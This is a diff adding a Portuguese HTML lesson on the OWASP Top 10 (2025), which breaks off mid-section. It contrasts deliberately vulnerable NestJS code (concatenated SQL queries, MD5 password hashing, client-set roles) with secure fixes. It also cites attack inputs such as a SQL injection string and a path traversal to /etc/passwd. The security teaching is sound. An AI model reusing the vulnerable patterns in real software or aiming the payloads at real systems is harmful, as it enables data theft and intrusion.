@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>28 — OWASP Top 10 (2025) | Full-Stack Mastery</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Outfit:wght@300;400;500;600;700;800&family=Source+Serif+4:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+--bg:#0c0e12;--bg2:#12151b;--bg3:#181c24;--bg4:#1e2330;
+--text:#d4d8e0;--text2:#8b92a0;--text3:#5c6370;
+--accent:#3dd68c;--accent2:#2bb87a;--accent-dim:rgba(61,214,140,.08);
+--orange:#e8915a;--blue:#5b9cf5;--purple:#b07aee;--red:#e05c6c;--yellow:#e2c55a;--cyan:#56b6c2;
+--code-bg:#0d1017;--code-border:#1a1f2a;
+--card:#151921;--card-border:#1e2430;
+--radius:12px;--radius-sm:8px;
+}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:'Outfit',sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}
+::selection{background:var(--accent);color:var(--bg)}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:3px}
+
+/* ── TOP NAV ── */
+.topnav{position:fixed;top:0;left:0;right:0;height:56px;background:var(--bg2);border-bottom:1px solid var(--card-border);display:flex;align-items:center;justify-content:space-between;padding:0 24px;z-index:100;backdrop-filter:blur(12px)}
+.topnav a{color:var(--text2);text-decoration:none;font-size:.82rem;font-weight:500;transition:color .2s}
+.topnav a:hover{color:var(--accent)}
+.topnav .nav-center{font-size:.75rem;color:var(--text3);font-weight:600;letter-spacing:1px;text-transform:uppercase}
+.topnav .nav-center span{color:var(--accent)}
+.topnav .nav-home{color:var(--text3);text-decoration:none;font-size:.82rem;font-weight:500;padding:4px 12px;border:1px solid var(--card-border);border-radius:var(--radius-sm);transition:all .2s;display:inline-flex;align-items:center;gap:4px}
+.topnav .nav-home:hover{color:var(--accent);border-color:var(--accent);background:var(--accent-dim)}
+.topnav .nav-right{display:flex;align-items:center;gap:12px}
+
+/* ── PROGRESS BAR ── */
+.progress-bar{position:fixed;top:56px;left:0;right:0;height:3px;background:var(--bg4);z-index:99}
+.progress-bar-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .3s;border-radius:0 2px 2px 0}
+
+/* ── MAIN ── */
+.main{margin-top:64px;min-height:100vh}
+.content{max-width:900px;margin:0 auto;padding:48px 32px 120px}
+
+/* ── SECTIONS ── */
+.section{margin-bottom:64px;scroll-margin-top:80px}
+.section-num{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--accent);letter-spacing:2px;margin-bottom:8px;display:block}
+.section h2{font-size:1.8rem;font-weight:700;letter-spacing:-.01em;margin-bottom:8px;line-height:1.3}
+.section-line{width:48px;height:3px;background:var(--accent);border-radius:2px;margin-bottom:28px}
+.section h3{font-size:1.15rem;font-weight:600;color:var(--text);margin:32px 0 12px;padding-left:14px;border-left:3px solid var(--accent)}
+.section h4{font-size:.95rem;font-weight:600;color:var(--orange);margin:24px 0 8px}
+.section p{color:var(--text2);margin-bottom:14px;font-size:.95rem}
+.section p strong{color:var(--text);font-weight:600}
+.section ul,.section ol{color:var(--text2);margin:8px 0 16px 20px;font-size:.9rem}
+.section li{margin-bottom:6px;line-height:1.6}
+.section li strong{color:var(--text);font-weight:600}
+.section li code{background:var(--bg4);padding:2px 7px;border-radius:4px;font-size:.8rem;color:var(--orange);font-family:'JetBrains Mono',monospace}
+
+/* ── CODE BLOCKS ── */
+pre{background:var(--code-bg);border:1px solid var(--code-border);border-radius:var(--radius);padding:20px 24px;overflow-x:auto;margin:16px 0 20px;position:relative}
+pre::before{content:attr(data-lang);position:absolute;top:8px;right:12px;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;background:var(--bg4);padding:2px 8px;border-radius:4px}
+code{font-family:'JetBrains Mono',monospace;font-size:.82rem;line-height:1.6;color:#c5cdd8}
+p code,.inline-code{background:var(--bg4);padding:2px 7px;border-radius:4px;font-size:.82rem;color:var(--orange);font-family:'JetBrains Mono',monospace}
+.kw{color:#c678dd}.fn{color:#61afef}.str{color:#98c379}.cm{color:#5c6370;font-style:italic}
+.num{color:#d19a66}.ann{color:#e5c07b}.tp{color:#e06c75}.op{color:#56b6c2}
+
+/* ── CARDS ── */
+.card{background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius);padding:24px;margin:16px 0}
+.card-title{font-size:.8rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card-title::before{content:'';width:8px;height:8px;background:var(--accent);border-radius:50%}
+.card.blue .card-title{color:var(--blue)}.card.blue .card-title::before{background:var(--blue)}
+.card.purple .card-title{color:var(--purple)}.card.purple .card-title::before{background:var(--purple)}
+.card.orange .card-title{color:var(--orange)}.card.orange .card-title::before{background:var(--orange)}
+
+/* ── DIAGRAMS ── */
+.diagram{display:flex;align-items:center;justify-content:center;gap:12px;flex-wrap:wrap;margin:20px 0;padding:24px;background:var(--bg3);border-radius:var(--radius);border:1px solid var(--card-border)}
+.diagram-box{padding:12px 20px;border-radius:var(--radius-sm);font-size:.8rem;font-weight:600;text-align:center;min-width:120px}
+.diagram-box.green{background:rgba(61,214,140,.12);border:1px solid rgba(61,214,140,.3);color:var(--accent)}
+.diagram-box.blue{background:rgba(91,156,245,.12);border:1px solid rgba(91,156,245,.3);color:var(--blue)}
+.diagram-box.purple{background:rgba(176,122,238,.12);border:1px solid rgba(176,122,238,.3);color:var(--purple)}
+.diagram-box.orange{background:rgba(232,145,90,.12);border:1px solid rgba(232,145,90,.3);color:var(--orange)}
+.diagram-box.red{background:rgba(224,92,108,.12);border:1px solid rgba(224,92,108,.3);color:var(--red)}
+.diagram-box.cyan{background:rgba(86,182,194,.12);border:1px solid rgba(86,182,194,.3);color:var(--cyan)}
+.diagram-arrow{color:var(--text3);font-size:1.2rem}
+
+/* ── TIPS ── */
+.tip{display:flex;gap:14px;padding:16px 20px;border-radius:var(--radius);margin:16px 0;font-size:.88rem;line-height:1.6}
+.tip.good{background:rgba(61,214,140,.06);border:1px solid rgba(61,214,140,.15);color:var(--accent)}
+.tip.warn{background:rgba(226,197,90,.06);border:1px solid rgba(226,197,90,.15);color:var(--yellow)}
+.tip.info{background:rgba(91,156,245,.06);border:1px solid rgba(91,156,245,.15);color:var(--blue)}
+.tip.bad{background:rgba(224,92,108,.06);border:1px solid rgba(224,92,108,.15);color:var(--red)}
+.tip-icon{font-size:1.1rem;flex-shrink:0;margin-top:2px}
+
+/* ── Q&A ── */
+.qa{background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius);margin:12px 0;overflow:hidden}
+.qa-q{padding:16px 20px;font-weight:600;color:var(--text);cursor:pointer;display:flex;align-items:center;gap:10px;font-size:.9rem;transition:background .15s}
+.qa-q:hover{background:var(--accent-dim)}
+.qa-q::before{content:'Q';font-family:'JetBrains Mono',monospace;font-size:.65rem;background:var(--accent);color:var(--bg);padding:3px 7px;border-radius:4px;font-weight:700}
+.qa-a{padding:0 20px 16px 20px;color:var(--text2);font-size:.88rem;display:none}
+.qa.open .qa-a{display:block}
+.qa.open .qa-q{border-bottom:1px solid var(--card-border)}
+
+/* ── TABLES ── */
+.table-wrap{overflow-x:auto;margin:16px 0 20px;border-radius:var(--radius);border:1px solid var(--card-border)}
+table{width:100%;border-collapse:collapse;font-size:.85rem}
+th{background:var(--bg4);color:var(--accent);font-weight:600;text-transform:uppercase;font-size:.7rem;letter-spacing:1px;padding:12px 16px;text-align:left}
+td{padding:10px 16px;border-top:1px solid var(--card-border);color:var(--text2)}
+tr:hover td{background:var(--accent-dim)}
+
+/* ── TAGS ── */
+.tag-list{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}
+.tag{display:inline-block;padding:4px 12px;background:var(--bg3);border:1px solid var(--card-border);border-radius:16px;font-size:.72rem;color:var(--text2);font-weight:500;transition:all .2s}
+
+/* ── QUIZ ── */
+.quiz-section{margin-top:64px;padding-top:32px;border-top:2px solid var(--card-border)}
+.quiz-section h3{border-left-color:var(--purple)}
+.quiz-card{background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius);padding:24px;margin:16px 0}
+.quiz-question{font-weight:600;color:var(--text);margin-bottom:16px;font-size:.92rem;display:flex;gap:10px}
+.quiz-question .q-num{font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:.8rem;min-width:28px}
+.quiz-options{display:flex;flex-direction:column;gap:8px;margin-bottom:8px}
+.quiz-option{display:flex;align-items:center;gap:12px;padding:10px 16px;background:var(--bg3);border:1px solid var(--card-border);border-radius:var(--radius-sm);cursor:pointer;transition:all .2s;font-size:.88rem;color:var(--text2)}
+.quiz-option:hover{border-color:var(--accent);background:var(--accent-dim)}
+.quiz-option.selected{border-color:var(--accent);background:var(--accent-dim);color:var(--text)}
+.quiz-option.correct{border-color:var(--accent);background:rgba(61,214,140,.15);color:var(--accent)}
+.quiz-option.wrong{border-color:var(--red);background:rgba(224,92,108,.1);color:var(--red)}
+.quiz-option input[type="radio"]{accent-color:var(--accent)}
+.quiz-explanation{display:none;padding:12px 16px;background:var(--bg3);border-radius:var(--radius-sm);margin-top:8px;font-size:.82rem;color:var(--text2);border-left:3px solid var(--accent)}
+.quiz-explanation.visible{display:block}
+.quiz-actions{display:flex;gap:12px;margin-top:24px;flex-wrap:wrap}
+.btn{padding:12px 28px;border-radius:var(--radius-sm);font-family:'Outfit',sans-serif;font-size:.88rem;font-weight:600;cursor:pointer;border:none;transition:all .2s}
+.btn-primary{background:var(--accent);color:var(--bg)}
+.btn-primary:hover{background:var(--accent2)}
+.btn-secondary{background:var(--bg3);color:var(--text2);border:1px solid var(--card-border)}
+.btn-secondary:hover{border-color:var(--accent);color:var(--accent)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.quiz-result{display:none;padding:24px;background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius);margin-top:24px;text-align:center}
+.quiz-result.visible{display:block}
+.quiz-score{font-size:2.4rem;font-weight:800;color:var(--accent);margin:8px 0}
+.quiz-score.low{color:var(--red)}
+.quiz-score.mid{color:var(--yellow)}
+
+/* ── WIZARD NAV ── */
+.wizard-nav{display:flex;justify-content:space-between;align-items:center;margin-top:64px;padding:32px 0;border-top:1px solid var(--card-border)}
+.wizard-nav a{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;background:var(--bg3);border:1px solid var(--card-border);border-radius:var(--radius-sm);color:var(--text2);text-decoration:none;font-size:.88rem;font-weight:500;transition:all .2s}
+.wizard-nav a:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.wizard-nav a.primary{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.wizard-nav a.primary:hover{background:var(--accent2)}
+.wizard-nav .wizard-home{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;background:var(--bg3);border:1px solid var(--card-border);border-radius:var(--radius-sm);color:var(--text2);text-decoration:none;font-size:.88rem;font-weight:500;transition:all .2s}
+.wizard-nav .wizard-home:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+
+/* ── RESPONSIVE ── */
+@media(max-width:768px){
+.content{padding:32px 16px 80px}
+.topnav{padding:0 12px}
+.section h2{font-size:1.4rem}
+}
+
+/* ── ANIMATIONS ── */
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.section{animation:fadeUp .5s ease both}
+</style>
+</head>
+<body>
+
+<!-- ── TOP NAVIGATION ── -->
+<nav class="topnav">
+<a href="27-serverless-edge-computing.html">&#8592; Anterior</a>
+<div class="nav-center">Seção <span>28</span> / 66</div>
+<div class="nav-right"><a href="../fullstack-mastery.html" class="nav-home" title="Voltar ao Dashboard">&#8962; Home</a>
+<a href="29-auth-oauth-jwt-rbac.html">Próximo &#8594;</a></div>
+</nav>
+<div class="progress-bar"><div class="progress-bar-fill" style="width:42.4%"></div></div>
+
+<!-- ── MAIN CONTENT ── -->
+<div class="main">
+<div class="content">
+
+<div class="section">
+<span class="section-num">SEÇÃO 28</span>
+<h2>OWASP Top 10 (2025)</h2>
+<div class="section-line"></div>
+
+<p>O OWASP Top 10 é a lista mais referenciada do mundo sobre vulnerabilidades em aplicações web. Publicada pela Open Worldwide Application Security Project, ela representa um consensó da industria sobre os <strong>riscos de segurança mais críticos</strong> que todo desenvolvedor full-stack precisa conhecer, detectar e mitigar.</p>
+
+<p>Não basta saber que "SQL Injection existe". Você precisa entender <strong>como cada ataque funciona na prática</strong>, como ele se manifesta no seu código TypeScript/NestJS/React, é como implementar defesas em múltiplas camadas. Segurança não é um checkbox — é uma <strong>mentalidade de design</strong> que permeia cada decisão arquitetural.</p>
+
+<div class="card blue">
+<div class="card-title">Por que OWASP Top 10 importa para Full-Stack Devs</div>
+<ul>
+<li><strong>Compliance:</strong> PCI-DSS, SOC 2 e ISO 27001 referênciam diretamente o OWASP Top 10</li>
+<li><strong>Entrevistas:</strong> Pergunta frequente em entrevistas para senior/staff — "Como você previne X?"</li>
+<li><strong>Custo:</strong> Uma vulnerabilidade em produção custa 100x mais para corrigir do que na fase de design</li>
+<li><strong>Responsabilidade:</strong> LGPD e GDPR responsabilizam desenvolvedores por negligência em segurança</li>
+</ul>
+</div>
+
+<!-- ═══ A01: BROKEN ACCESS CONTROL ═══ -->
+<h3>A01: Broken Access Control</h3>
+<p>A vulnerabilidade número 1 do OWASP. Ocorre quando usuários conseguem acessar recursos ou executar ações <strong>fora das permissões previstas</strong>. O tipo mais comum é o IDOR (Insecure Direct Object Reference) — quando um usuário manipula um ID na URL ou body para acessar dados de outro usuário.</p>
+
+<p><strong>Cenários reais de ataque:</strong></p>
+<ul>
+<li><strong>IDOR:</strong> <code>GET /api/orders/123</code> — usuário alterá para <code>/api/orders/456</code> é ve pedido de outro cliente</li>
+<li><strong>Escalação de privilégios:</strong> Usuário comum alterá <code>role: "admin"</code> no body do request</li>
+<li><strong>Acessó direto a arquivos:</strong> <code>/uploads/../../etc/passwd</code> — path traversal</li>
+<li><strong>Missing function-level access control:</strong> Endpoint admin acessível sem autenticação</li>
+</ul>
+
+<h4>Vulnerável vs Seguro — NestJS</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; VULNERÁVEL — Nenhuma verificação de ownership</span>
+<span class="ann">@Get</span>(<span class="str">'orders/:id'</span>)
+<span class="kw">async</span> <span class="fn">getOrder</span>(<span class="ann">@Param</span>(<span class="str">'id'</span>) id: <span class="tp">string</span>) {
+  <span class="cm">// Qualquer usuário autenticado pode ver QUALQUER pedido</span>
+  <span class="kw">return</span> <span class="kw">this</span>.ordersRepo.<span class="fn">findOneBy</span>({ id });
+}
+
+<span class="cm">// &#10060; VULNERÁVEL — Aceita role do body (escalação de privilégios)</span>
+<span class="ann">@Post</span>(<span class="str">'users'</span>)
+<span class="kw">async</span> <span class="fn">createUser</span>(<span class="ann">@Body</span>() dto: <span class="tp">CreateUserDto</span>) {
+  <span class="cm">// Atacante envia { name: "hacker", role: "admin" }</span>
+  <span class="kw">return</span> <span class="kw">this</span>.usersRepo.<span class="fn">save</span>(dto);
+}
+
+<span class="cm">// &#9989; SEGURO — Verifica ownership + ignora role do body</span>
+<span class="ann">@Get</span>(<span class="str">'orders/:id'</span>)
+<span class="ann">@UseGuards</span>(<span class="tp">JwtAuthGuard</span>)
+<span class="kw">async</span> <span class="fn">getOrder</span>(
+  <span class="ann">@Param</span>(<span class="str">'id'</span>) id: <span class="tp">string</span>,
+  <span class="ann">@CurrentUser</span>() user: <span class="tp">AuthUser</span>,
+) {
+  <span class="kw">const</span> order = <span class="kw">await</span> <span class="kw">this</span>.ordersRepo.<span class="fn">findOneBy</span>({ id });
+  <span class="kw">if</span> (!order) <span class="kw">throw new</span> <span class="tp">NotFoundException</span>();
+
+  <span class="cm">// Verifica se o pedido pertence ao usuário autenticado</span>
+  <span class="kw">if</span> (order.userId !== user.id &amp;&amp; user.role !== <span class="str">'admin'</span>) {
+    <span class="kw">throw new</span> <span class="tp">ForbiddenException</span>(<span class="str">'Acessó negado'</span>);
+  }
+
+  <span class="kw">return</span> order;
+}
+
+<span class="cm">// &#9989; SEGURO — Role definido pelo servidor, nunca pelo cliente</span>
+<span class="ann">@Post</span>(<span class="str">'users'</span>)
+<span class="kw">async</span> <span class="fn">createUser</span>(<span class="ann">@Body</span>() dto: <span class="tp">CreateUserDto</span>) {
+  <span class="kw">const</span> user = <span class="kw">this</span>.usersRepo.<span class="fn">create</span>({
+    name: dto.name,
+    email: dto.email,
+    role: <span class="str">'user'</span>,  <span class="cm">// Sempre default — admin só via painel interno</span>
+  });
+  <span class="kw">return</span> <span class="kw">this</span>.usersRepo.<span class="fn">save</span>(user);
+}</code></pre>
+
+<div class="tip good">
+<span class="tip-icon">&#10022;</span>
+<div><strong>Regra de ouro:</strong> Nunca confie em IDs vindos do cliente. Sempre filtre queries pelo userId do token JWT: <code>WHERE userId = :authenticatedUserId AND id = :requestedId</code>.</div>
+</div>
+
+<!-- ═══ A02: SECURITY MISCONFIGURATION ═══ -->
+<h3>A02: Security Misconfiguration</h3>
+<p>Configurações inseguras são portas abertas para atacantes. Isso inclui <strong>credenciais padrão</strong>, stack traces expostos em produção, headers de segurança ausentes, CORS aberto para qualquer origem, e serviços de cloud com permissões excessivas.</p>
+
+<p><strong>Exemplos comuns de misconfiguration:</strong></p>
+<ul>
+<li><strong>Default credentials:</strong> Admin/admin em paineis, bancos de dados sem senha</li>
+<li><strong>Stack traces:</strong> Erros 500 retornando detalhes do servidor (versão do Node, paths de arquivo)</li>
+<li><strong>CORS permissivo:</strong> <code>Access-Control-Allow-Origin: *</code> com credenciais</li>
+<li><strong>Directory listing:</strong> Servidor expondo estrutura de pastas</li>
+<li><strong>Headers ausentes:</strong> Sem X-Content-Type-Options, sem HSTS, sem CSP</li>
+<li><strong>Cloud storage público:</strong> S3 bucket aberto para leitura/escrita</li>
+</ul>
+
+<h4>Helmet.js — Security Headers para Express/NestJS</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; SEM proteção — headers padrões do Express expõe informações</span>
+<span class="kw">const</span> app = <span class="kw">await</span> <span class="tp">NestFactory</span>.<span class="fn">create</span>(<span class="tp">AppModule</span>);
+app.<span class="fn">listen</span>(<span class="num">3000</span>);
+<span class="cm">// Response headers: X-Powered-By: Express  (informa o framework!)</span>
+
+<span class="cm">// &#9989; COM Helmet — adiciona 11+ headers de segurança</span>
+<span class="kw">import</span> helmet <span class="kw">from</span> <span class="str">'helmet'</span>;
+
+<span class="kw">const</span> app = <span class="kw">await</span> <span class="tp">NestFactory</span>.<span class="fn">create</span>(<span class="tp">AppModule</span>);
+
+app.<span class="fn">use</span>(<span class="fn">helmet</span>({
+  <span class="cm">// Content-Security-Policy — previne XSS e injeção de scripts</span>
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: [<span class="str">"'self'"</span>],
+      scriptSrc: [<span class="str">"'self'"</span>],
+      styleSrc: [<span class="str">"'self'"</span>, <span class="str">"'unsafe-inline'"</span>],
+      imgSrc: [<span class="str">"'self'"</span>, <span class="str">'data:'</span>, <span class="str">'https:'</span>],
+      connectSrc: [<span class="str">"'self'"</span>, <span class="str">'https://api.seudomínio.com'</span>],
+    },
+  },
+  <span class="cm">// Strict-Transport-Security — força HTTPS</span>
+  hsts: { maxAge: <span class="num">31536000</span>, includeSubDomains: <span class="kw">true</span>, preload: <span class="kw">true</span> },
+  <span class="cm">// X-Content-Type-Options: nosniff</span>
+  noSniff: <span class="kw">true</span>,
+  <span class="cm">// X-Frame-Options: DENY (previne clickjacking)</span>
+  frameguard: { action: <span class="str">'deny'</span> },
+  <span class="cm">// Referrer-Policy</span>
+  referrerPolicy: { policy: <span class="str">'strict-origin-when-cross-origin'</span> },
+}));
+
+<span class="cm">// CORS restritivo</span>
+app.<span class="fn">enableCors</span>({
+  origin: [<span class="str">'https://app.seudomínio.com'</span>],
+  credentials: <span class="kw">true</span>,
+  methods: [<span class="str">'GET'</span>, <span class="str">'POST'</span>, <span class="str">'PUT'</span>, <span class="str">'DELETE'</span>],
+});
+
+app.<span class="fn">listen</span>(<span class="num">3000</span>);</code></pre>
+
+<div class="card">
+<div class="card-title">Checklist de Security Headers</div>
+<div class="table-wrap">
+<table>
+<tr><th>Header</th><th>Valor Recomendado</th><th>Previne</th></tr>
+<tr><td><code>Strict-Transport-Security</code></td><td>max-age=31536000; includeSubDomains</td><td>Downgrade HTTPS para HTTP</td></tr>
+<tr><td><code>Content-Security-Policy</code></td><td>default-src 'self'</td><td>XSS, injeção de scripts</td></tr>
+<tr><td><code>X-Content-Type-Options</code></td><td>nosniff</td><td>MIME type sniffing</td></tr>
+<tr><td><code>X-Frame-Options</code></td><td>DENY</td><td>Clickjacking</td></tr>
+<tr><td><code>Referrer-Policy</code></td><td>strict-origin-when-cross-origin</td><td>Vazamento de URL em referrer</td></tr>
+<tr><td><code>Permissions-Policy</code></td><td>camera=(), microphone=(), geolocation=()</td><td>Acessó indevido a APIs do browser</td></tr>
+<tr><td><code>X-XSS-Protection</code></td><td>0 (desativado — use CSP ao invés)</td><td>Legado, CSP e superior</td></tr>
+</table>
+</div>
+</div>
+
+<!-- ═══ A03: SUPPLY CHAIN FAILURES ═══ -->
+<h3>A03: Supply Chain Failures</h3>
+<p>Ataques na cadeia de suprimentos exploram a confiança que temos em <strong>dependências de terceiros</strong>. No ecossistema npm, com milhões de pacotes, um único pacote comprometido pode afetar milhares de projetos. A superficie de ataque inclui: pacotes maliciosos, lockfile poisoning, typosquatting, e CI/CD pipeline injection.</p>
+
+<p><strong>Vetores de ataque reais:</strong></p>
+<ul>
+<li><strong>Typosquatting:</strong> Pacote <code>cross-env</code> (legit) vs <code>crossenv</code> (malicioso) — roubava env vars</li>
+<li><strong>Dependency confusion:</strong> Atacante pública pacote público com mesmo nome de pacote privado interno</li>
+<li><strong>Lockfile poisoning:</strong> PR maliciosó alterá <code>package-lock.json</code> para apontar para registry falso</li>
+<li><strong>Maintainer compromise:</strong> Conta npm de maintainer popular e hackeada (ex: event-stream, ua-parser-js)</li>
+<li><strong>CI/CD injection:</strong> Atacante injeta comandos em pipelines via branch names ou PR titles</li>
+</ul>
+
+<h4>Defesas Práticas</h4>
+<pre data-lang="bash"><code><span class="cm"># Auditar vulnerabilidades conhecidas</span>
+npm audit
+npm audit --audit-level=high
+
+<span class="cm"># Verificar pacotes antes de instalar</span>
+npm view &lt;pacote&gt; maintainers
+npm view &lt;pacote&gt; repository
+
+<span class="cm"># Fixar versões exatas (sem ^ ou ~)</span>
+npm install --save-exact express@4.18.2
+
+<span class="cm"># Usar lockfile integrity — garantir que ninguém alterou</span>
+npm ci  <span class="cm"># Instala EXATAMENTE o que está no lockfile</span>
+
+<span class="cm"># Snyk — scanner mais profundo que npm audit</span>
+npx snyk test
+npx snyk monitor  <span class="cm"># Monitora continuamente</span></code></pre>
+
+<pre data-lang="yaml"><code><span class="cm"># GitHub Actions — scan automático no CI</span>
+name: Security Scan
+on: [push, pull_request]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci
+      - run: npm audit --audit-level=high
+      - name: Snyk Security Scan
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}</code></pre>
+
+<div class="tip warn">
+<span class="tip-icon">&#9888;</span>
+<div><strong>Regra crítica:</strong> Sempre revise PRs que alterám <code>package.json</code> ou <code>package-lock.json</code>. Um diff de lockfile com registry URL diferente e sinal de alerta máximo.</div>
+</div>
+
+<!-- ═══ A04: CRYPTOGRAPHIC FAILURES ═══ -->
+<h3>A04: Cryptographic Failures</h3>
+<p>Dados sensíveis transmitidos ou armazenados sem proteção criptografica adequada. Isso inclui <strong>senhas em texto puro</strong>, usó de algoritmos fracos (MD5, SHA1 para hashing de senhas), ausência de TLS, e chaves de criptografia hardcoded no código.</p>
+
+<p><strong>Erros comuns:</strong></p>
+<ul>
+<li><strong>Senhas com MD5/SHA256:</strong> São hash functions, não password hashing. São rápidas demais — atacante faz bilhoes de tentativas por segundo</li>
+<li><strong>Dados sensíveis em logs:</strong> <code>console.log('Payment:', { cardNumber, cvv })</code></li>
+<li><strong>HTTP em produção:</strong> Dados trafegam em texto puro — qualquer man-in-the-middle intercepta</li>
+<li><strong>Secrets no código:</strong> API keys, tokens e senhas commitados no repositório</li>
+</ul>
+
+<h4>Hashing de Senhas — bcrypt e Argon2</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; INSEGURO — MD5/SHA256 não são para senhas</span>
+<span class="kw">import</span> { createHash } <span class="kw">from</span> <span class="str">'crypto'</span>;
+
+<span class="kw">function</span> <span class="fn">hashPassword</span>(password: <span class="tp">string</span>): <span class="tp">string</span> {
+  <span class="cm">// MD5 — quebrado em segundos com rainbow tables</span>
+  <span class="kw">return</span> <span class="fn">createHash</span>(<span class="str">'md5'</span>).<span class="fn">update</span>(password).<span class="fn">digest</span>(<span class="str">'hex'</span>);
+}
+
+<span class="cm">// &#9989; SEGURO — bcrypt com salt automático e work factor</span>
+<span class="kw">import</span> * <span class="kw">as</span> bcrypt <span class="kw">from</span> <span class="str">'bcrypt'</span>;
+
+<span class="kw">const</span> SALT_ROUNDS = <span class="num">12</span>; <span class="cm">// ~250ms por hash — lento de propósito</span>
+
+<span class="kw">async function</span> <span class="fn">hashPassword</span>(password: <span class="tp">string</span>): <span class="tp">Promise</span>&lt;<span class="tp">string</span>&gt; {
+  <span class="kw">return</span> bcrypt.<span class="fn">hash</span>(password, SALT_ROUNDS);
+}
+
+<span class="kw">async function</span> <span class="fn">verifyPassword</span>(password: <span class="tp">string</span>, hash: <span class="tp">string</span>): <span class="tp">Promise</span>&lt;<span class="tp">boolean</span>&gt; {
+  <span class="kw">return</span> bcrypt.<span class="fn">compare</span>(password, hash);
+}
+
+<span class="cm">// &#9989; AINDA MELHOR — Argon2id (vencedor do Password Hashing Competition)</span>
+<span class="kw">import</span> * <span class="kw">as</span> argon2 <span class="kw">from</span> <span class="str">'argon2'</span>;
+
+<span class="kw">async function</span> <span class="fn">hashPassword</span>(password: <span class="tp">string</span>): <span class="tp">Promise</span>&lt;<span class="tp">string</span>&gt; {
+  <span class="kw">return</span> argon2.<span class="fn">hash</span>(password, {
+    type: argon2.argon2id,   <span class="cm">// Resistente a side-channel + GPU</span>
+    memoryCost: <span class="num">65536</span>,       <span class="cm">// 64 MB de RAM</span>
+    timeCost: <span class="num">3</span>,              <span class="cm">// 3 iteráções</span>
+    parallelism: <span class="num">4</span>,           <span class="cm">// 4 threads</span>
+  });
+}
+
+<span class="kw">async function</span> <span class="fn">verifyPassword</span>(password: <span class="tp">string</span>, hash: <span class="tp">string</span>): <span class="tp">Promise</span>&lt;<span class="tp">boolean</span>&gt; {
+  <span class="kw">return</span> argon2.<span class="fn">verify</span>(hash, password);
+}</code></pre>
+
+<div class="card orange">
+<div class="card-title">Hierarquia de Hashing de Senhas</div>
+<ul>
+<li><strong>Argon2id</strong> — Estado da arte. Resistente a GPU e side-channel attacks. Use se possível</li>
+<li><strong>bcrypt</strong> — Excelente escolha, battle-tested por 25+ anos. Salt rounds >= 12</li>
+<li><strong>scrypt</strong> — Boa alternativa, memory-hard. Usado pelo Node.js internamente</li>
+<li><strong>PBKDF2</strong> — Aceitável (NIST approved), mas inferior a bcrypt/Argon2. Mínimo 600k iteráções</li>
+<li><strong style="color:var(--red)">SHA-256/SHA-512</strong> — NÃO para senhas. São rápidas demais (bilhoes/seg com GPU)</li>
+<li><strong style="color:var(--red)">MD5/SHA-1</strong> — NUNCA. Quebrados, colisões conhecidas</li>
+</ul>
+</div>
+
+<!-- ═══ A05: INJECTION ═══ -->
+<h3>A05: Injection</h3>
+<p>Ataques de injeção ocorrem quando <strong>dados não confiáveis são enviados a um interpretador</strong> como parte de um comando ou query. Isso inclui SQL Injection, NoSQL Injection, XSS (Cross-Site Scripting), Command Injection e LDAP Injection. A defesa principal é sempre <strong>parametrizar</strong> — nunca concatenar input do usuário em queries ou comandos.</p>
+
+<h4>SQL Injection — Vulnerável vs Seguro</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; SQL INJECTION — Concatenação direta de input do usuário</span>
+<span class="ann">@Get</span>(<span class="str">'users'</span>)
+<span class="kw">async</span> <span class="fn">findUsers</span>(<span class="ann">@Query</span>(<span class="str">'name'</span>) name: <span class="tp">string</span>) {
+  <span class="cm">// Atacante envia: name = ' OR '1'='1' --</span>
+  <span class="cm">// Query vira: SELECT * FROM users WHERE name = '' OR '1'='1' --'</span>
+  <span class="cm">// Resultado: TODOS os usuários retornados!</span>
+  <span class="kw">const</span> result = <span class="kw">await</span> <span class="kw">this</span>.db.<span class="fn">query</span>(
+    <span class="str">`SELECT * FROM users WHERE name = '${name}'`</span>
+  );
+  <span class="kw">return</span> result;
+}
+
+<span class="cm">// &#9989; SEGURO — Parametrized query (prepared statement)</span>
+<span class="ann">@Get</span>(<span class="str">'users'</span>)
+<span class="kw">async</span> <span class="fn">findUsers</span>(<span class="ann">@Query</span>(<span class="str">'name'</span>) name: <span class="tp">string</span>) {
+  <span class="cm">// O driver envia o valor separado da query — NUNCA concatena</span>
